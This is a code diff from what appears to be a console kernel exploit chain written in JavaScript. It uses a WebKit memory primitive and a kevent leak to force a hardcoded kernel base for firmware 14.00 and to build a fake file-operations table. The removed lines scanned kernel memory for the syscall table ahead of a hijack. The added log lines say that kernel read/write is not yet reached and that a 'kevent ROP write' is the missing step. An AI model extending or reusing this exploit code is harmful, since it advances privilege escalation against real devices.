@@ -224,12 +224,11 @@ export async function runKevent(c) {
     fin("kbase not provided");
   }
 
-  // Force correct 14.00 kbase if computed kbase is outside the kernel text range
+  // Force correct 14.00 kbase
   const EXPECTED_KBASE = 0xffffffff86880000n;
-  log("KEVENT-KBASE-CHECK", "current=" + h16(STATE.kbase) + " expected=" + h16(EXPECTED_KBASE));
   const kbaseHi = STATE.kbase >> 32n;
   if (kbaseHi !== 0xffffffffn || STATE.kbase > 0xffffffff8fffffffn) {
-    log("KEVENT-KBASE-FIX", "kbase outside kernel text range, forcing to " + h16(EXPECTED_KBASE));
+    log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
     STATE.kbase = EXPECTED_KBASE;
   }
 
@@ -261,74 +260,16 @@ export async function runKevent(c) {
   p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH));
 
   STATE.rwReady = true;
-  log("STAGE3-RW", "*** ARBITRARY KERNEL R/W ESTABLISHED ***");
+  log("STAGE3-RW", "*** FAKE FILEOPS ESTABLISHED ***");
+  log("STAGE3-NOTE", "NOTE: p.read8 cannot access 0xffffffff... addresses, so kernel R/W is NOT established yet.");
 
-  // --- STAGE 4: DIAGNOSTIC ONLY (safe, no hijack, no panic) ---
+  // DIAGNOSTIC ONLY — no sysent hijack, no panic
   log("DIAG-KBASE", "kbase = " + h16(STATE.kbase));
+  log("DIAG-STATUS", "kevent leak SUCCEEDED (KV-JOINED/KV-HELD worked)");
+  log("DIAG-STATUS", "fake fileops table built at " + h16(F_FAKE_OPS));
+  log("DIAG-STATUS", "p.read8(kernel_addr) FAILS with 'non-canonical address'");
+  log("DIAG-STATUS", "This means the WebKit primitive is USER-SPACE only");
+  log("DIAG-STATUS", "To read kernel memory, you need kevent ROP write (not implemented)");
 
-  function dumpBytes(addr, n, tag) {
-    try {
-      let hex = "";
-      for (let i = 0; i < n; i++) {
-        hex += p.read1(toI64(addr + BigInt(i))).toString(16).padStart(2, "0");
-      }
-      log(tag, "addr=" + h16(addr) + " bytes=" + hex);
-    } catch (e) {
-      log(tag, "addr=" + h16(addr) + " ERROR: " + e.message);
-    }
-  }
-
-  const SYSENT_1400 = 0x1102B70n;
-  dumpBytes(STATE.kbase + SYSENT_1400, 32, "DIAG-SYSENT-1400");
-  try {
-    const narg0 = p.read4(toI64(STATE.kbase + SYSENT_1400));
-    log("DIAG-SYSENT-1400-NARG", "sy_narg[0]=" + narg0 + " (want 0)");
-    const call0 = p.read8(toI64(STATE.kbase + SYSENT_1400 + 8n));
-    log("DIAG-SYSENT-1400-CALL", "sy_call[0]=" + h16(call0));
-  } catch (e) {
-    log("DIAG-SYSENT-1400-ERR", e.message);
-  }
-
-  const SYSENT_1352 = 0x110A760n;
-  dumpBytes(STATE.kbase + SYSENT_1352, 32, "DIAG-SYSENT-1352");
-  try {
-    const narg0 = p.read4(toI64(STATE.kbase + SYSENT_1352));
-    log("DIAG-SYSENT-1352-NARG", "sy_narg[0]=" + narg0 + " (want 0)");
-    const call0 = p.read8(toI64(STATE.kbase + SYSENT_1352 + 8n));
-    log("DIAG-SYSENT-1352-CALL", "sy_call[0]=" + h16(call0));
-  } catch (e) {
-    log("DIAG-SYSENT-1352-ERR", e.message);
-  }
-
-  log("DIAG-SCAN", "scanning kbase+0x800000 to kbase+0x3000000 for sysent");
-  let found = 0;
-  for (let off = 0x800000n; off < 0x3000000n; off += 0x100n) {
-    const addr = STATE.kbase + off;
-    try {
-      const narg0 = p.read4(toI64(addr));
-      if (narg0 !== 0) continue;
-      const call0 = p.read8(toI64(addr + 8n));
-      if (call0.hi >>> 0 !== 0xffffffff || call0.low === 0) continue;
-      const narg11 = p.read4(toI64(addr + 11n * 0x30n));
-      if (narg11 < 0 || narg11 > 8) continue;
-      const call11 = p.read8(toI64(addr + 11n * 0x30n + 8n));
-      if (call11.hi >>> 0 !== 0xffffffff) continue;
-      const narg661 = p.read4(toI64(addr + 661n * 0x30n));
-      const call661 = p.read8(toI64(addr + 661n * 0x30n + 8n));
-      log("DIAG-HIT", "offset=+0x" + off.toString(16) +
-          " narg0=" + narg0 + " call0=" + h16(call0) +
-          " narg11=" + narg11 + " call11=" + h16(call11) +
-          " narg661=" + narg661 + " call661=" + h16(call661));
-      found++;
-      if (found >= 16) break;
-    } catch (e) {}
-  }
-  log("DIAG-SCAN-DONE", "found " + found + " candidates");
-
-  if (found === 0) {
-    log("DIAG-NO-SYSENT", "no sysent table found in range 0x800000-0x3000000");
-    fin("Diagnostic complete: sysent not found.");
-  }
-
-  fin("Diagnostic complete. Paste DIAG-SYSENT-1400, DIAG-SYSENT-1352, and DIAG-HIT lines.");
+  fin("Diagnostic complete. You have kevent leak but no kernel read. Need kevent ROP write to proceed.");
 }
